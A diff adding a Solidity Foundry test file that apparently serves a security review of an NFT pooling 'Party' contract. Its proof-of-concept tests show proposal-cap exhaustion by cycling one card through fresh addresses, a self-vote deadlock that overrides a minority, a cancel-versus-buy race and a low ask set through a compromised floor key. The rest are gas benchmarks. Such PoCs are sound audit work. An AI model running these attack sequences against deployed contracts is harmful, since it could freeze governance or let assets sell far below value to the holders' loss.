@@ -1,0 +1,200 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {LocalBase} from "./LocalBase.t.sol";
+import {Party} from "../src/Party.sol";
+import {CreditKeys} from "../src/CreditKeys.sol";
+
+contract PocTest is LocalBase {
+    Party party;
+    uint256[] ids;
+
+    function _fill(CreditKeys.Preset p) internal {
+        party = factory.createParty(params(p));
+        uint256[] memory a = ownedBy(holders[0]);
+        uint256[] memory b = ownedBy(holders[1]);
+        uint256[] memory d0 = new uint256[](60);
+        uint256[] memory d1 = new uint256[](20);
+        for (uint256 i; i < 60; ++i) d0[i] = a[i];
+        for (uint256 i; i < 20; ++i) d1[i] = b[i];
+        deposit(party, holders[0], d0);
+        deposit(party, holders[1], d1);
+        ids = party.depositOrder();
+        assertEq(uint256(party.status()), uint256(Party.Status.FULL));
+    }
+
+    function _cardsOf(address who) internal view returns (uint256[] memory out) {
+        uint256 n = cards.balanceOf(who);
+        out = new uint256[](n);
+        uint256 k;
+        for (uint256 id = 1; id < cards.nextId() && k < n; ++id) {
+            try cards.ownerOf(id) returns (address o) { if (o == who) out[k++] = id; } catch {}
+        }
+    }
+
+    /// One card, passed between fresh addresses, exhausts the lifetime MAX_PROPOSALS cap.
+    function test_poc_proposalCapExhaustion_oneCard() public {
+        _fill(CreditKeys.Preset.Deposit);
+        uint256 card = _cardsOf(holders[1])[0];
+        address cur = makeAddr("atk0");
+        vm.prank(holders[1]);
+        cards.transferFrom(holders[1], cur, card);
+        vm.roll(block.number + 1);
+        Party.PriceSpec memory ps = Party.PriceSpec(Party.PriceMode.Fixed, 1000 ether);
+        uint256 gasUsed;
+        uint256 k;
+        while (party.proposalCount() < 256) {
+            for (uint256 j; j < 3 && party.proposalCount() < 256; ++j) {
+                uint256 g = gasleft();
+                vm.prank(cur);
+                party.propose(ps, false, 24);
+                gasUsed += g - gasleft();
+            }
+            address nxt = makeAddr(string.concat("atk", vm.toString(++k)));
+            vm.prank(cur);
+            cards.transferFrom(cur, nxt, card);
+            cur = nxt;
+            vm.roll(block.number + 1);
+        }
+        emit log_named_uint("attacker addresses", k);
+        emit log_named_uint("total propose gas for 256", gasUsed);
+        // 60-card majority can no longer propose anything, ever (before or after assembly)
+        vm.prank(holders[0]);
+        vm.expectRevert(abi.encodeWithSelector(Party.Bad.selector, "too many"));
+        party.propose(Party.PriceSpec(Party.PriceMode.Fixed, 2 ether), false, 24);
+    }
+
+    /// A single card holder self-NOs three of their own proposals and permanently flips the party into deadlock mode.
+    function test_poc_selfBlockDeadlock() public {
+        _fill(CreditKeys.Preset.Deposit);
+        uint256 card = _cardsOf(holders[1])[0];
+        address atk = makeAddr("atk");
+        vm.prank(holders[1]);
+        cards.transferFrom(holders[1], atk, card);
+        vm.roll(block.number + 1);
+        Party.PriceSpec memory ps = Party.PriceSpec(Party.PriceMode.Fixed, 1000 ether);
+        for (uint256 i; i < 3; ++i) {
+            vm.prank(atk);
+            uint256 id = party.propose(ps, false, 24);
+            vm.prank(atk);
+            party.vote(id, false);
+        }
+        vm.warp(block.timestamp + 25 hours);
+        for (uint256 i; i < 3; ++i) party.countBlocked(i);
+        vm.roll(block.number + 1);
+        vm.prank(holders[0]);
+        uint256 pid = party.propose(Party.PriceSpec(Party.PriceMode.Fixed, 5 ether), false, 24);
+        assertTrue(party.proposal(pid).deadlock, "deadlock mode on");
+        vm.prank(holders[1]); // 19 cards vote NO: ignored
+        party.vote(pid, false);
+        vm.warp(block.timestamp + 25 hours);
+        Party.Floor memory fl = floorSig(1 ether, 0);
+        vm.prank(holders[0]);
+        party.execute(pid, fl); // 60 YES, 19 NO: passes
+        assertTrue(party.hasPendingPrice());
+    }
+
+    /// Cancel proposed at the moment the default ask goes live cannot execute before buy() opens.
+    function test_poc_cancelRacesBuy() public {
+        _fill(CreditKeys.Preset.Deposit);
+        vm.prank(holders[0]);
+        party.assemble(ids, noFloor());
+        uint64 live = party.askLiveAt();
+        vm.roll(block.number + 1);
+        vm.prank(holders[0]);
+        uint256 cid = party.propose(Party.PriceSpec(Party.PriceMode.Fixed, 0), true, 24);
+        vm.warp(uint256(live) + 24 hours - 1);
+        vm.prank(holders[0]);
+        vm.expectRevert(abi.encodeWithSelector(Party.Bad.selector, "voting open"));
+        party.execute(cid, noFloor());
+        vm.warp(uint256(live) + 24 hours);
+        address buyer = makeAddr("buyer");
+        vm.deal(buyer, 10 ether);
+        vm.prank(buyer);
+        party.buy{value: 3 ether}(3 ether); // buyer ordered first in the block wins
+        assertTrue(party.sold());
+    }
+
+    /// Floor key compromise: floor-relative default price resolves to 1 wei-scale ask at assembly.
+    function test_poc_floorKeySetsLowAsk() public {
+        Party.Params memory p = params(CreditKeys.Preset.Deposit);
+        p.defaultPrice = Party.PriceSpec(Party.PriceMode.FloorPct, 0);
+        party = factory.createParty(p);
+        uint256[] memory a = ownedBy(holders[0]);
+        uint256[] memory b = ownedBy(holders[1]);
+        uint256[] memory d0 = new uint256[](60);
+        uint256[] memory d1 = new uint256[](20);
+        for (uint256 i; i < 60; ++i) d0[i] = a[i];
+        for (uint256 i; i < 20; ++i) d1[i] = b[i];
+        deposit(party, holders[0], d0);
+        deposit(party, holders[1], d1);
+        uint256[] memory o = party.depositOrder();
+        Party.Floor memory fl = floorSig(1e9, 0);
+        vm.prank(holders[1]);
+        party.assemble(o, fl);
+        assertEq(party.ask(), 1e9);
+    }
+
+    function test_gas_assemble_rarity_and_ink() public {
+        _fill(CreditKeys.Preset.Rarity);
+        uint256[] memory right = _sort(CreditKeys.Preset.Rarity, ids);
+        uint256 g = gasleft();
+        vm.prank(holders[0]);
+        party.assemble(right, noFloor());
+        emit log_named_uint("assemble gas rarity (local mock statement)", g - gasleft());
+    }
+
+    function test_gas_assemble_deposit() public {
+        _fill(CreditKeys.Preset.Deposit);
+        uint256 g = gasleft();
+        vm.prank(holders[0]);
+        party.assemble(ids, noFloor());
+        emit log_named_uint("assemble gas deposit preset", g - gasleft());
+    }
+
+    function test_gas_redeem_worst() public {
+        party = factory.createParty(params(CreditKeys.Preset.Deposit));
+        uint256[] memory a = ownedBy(holders[0]);
+        uint256[] memory b = ownedBy(holders[1]);
+        uint256[] memory d0 = new uint256[](60);
+        uint256[] memory d1 = new uint256[](19);
+        for (uint256 i; i < 60; ++i) d0[i] = a[i];
+        for (uint256 i; i < 19; ++i) d1[i] = b[i];
+        deposit(party, holders[0], d0);
+        deposit(party, holders[1], d1);
+        uint256[] memory c = new uint256[](1);
+        c[0] = _cardsOf(holders[0])[0]; // first slot: shifts 78 entries
+        uint256 g = gasleft();
+        vm.prank(holders[0]);
+        party.redeem(c);
+        emit log_named_uint("redeem gas, slot 0 of 79", g - gasleft());
+        uint256[] memory all = _cardsOf(holders[0]);
+        g = gasleft();
+        vm.prank(holders[0]);
+        party.redeem(all);
+        emit log_named_uint("redeem gas, 59 cards front-first", g - gasleft());
+    }
+
+    function _sort(CreditKeys.Preset p, uint256[] memory xs) internal view returns (uint256[] memory out) {
+        out = new uint256[](xs.length);
+        uint256[] memory k = new uint256[](xs.length);
+        for (uint256 i; i < xs.length; ++i) { out[i] = xs[i]; k[i] = this.keyOf(p, xs[i]); }
+        for (uint256 i = 1; i < out.length; ++i) {
+            uint256 j = i;
+            while (j > 0 && k[j - 1] > k[j]) {
+                (k[j - 1], k[j]) = (k[j], k[j - 1]);
+                (out[j - 1], out[j]) = (out[j], out[j - 1]);
+                --j;
+            }
+        }
+    }
+
+    function keyOf(CreditKeys.Preset p, uint256 id) external view returns (uint256) {
+        return CreditKeys.key(p, credits_(), art_(), id);
+    }
+
+    function credits_() internal view returns (ICreditsX) { return ICreditsX(address(credits)); }
+    function art_() internal view returns (IArtX) { return IArtX(address(credits.art())); }
+}
+
+import {ICredits as ICreditsX, ICreditArt as IArtX} from "../src/interfaces/IExternal.sol";
